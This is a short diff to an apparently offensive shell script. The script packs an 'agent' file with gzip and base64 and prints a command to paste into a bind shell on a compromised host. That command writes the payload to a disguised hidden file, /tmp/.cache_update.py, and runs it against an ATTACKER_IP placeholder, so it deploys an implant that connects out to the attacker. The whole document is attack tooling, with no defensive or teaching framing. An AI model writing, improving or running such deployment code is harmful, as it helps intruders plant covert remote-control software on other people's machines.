@@ -13,11 +13,11 @@ if [ ! -f "$AGENT_FILE" ]; then
     exit 1
 fi
 
-B64=$(base64 -w0 "$AGENT_FILE")
+B64=$(gzip -c "$AGENT_FILE" | base64 -w0)
 
 echo "[*] Deploy command generated. Paste this into the bind shell:"
 echo ""
-echo "echo '${B64}' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
+echo "echo '${B64}' | base64 -d | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
 echo ""
 echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
-echo "[*] Base64 size: ${#B64} chars"
+echo "[*] Compressed base64 size: ${#B64} chars"
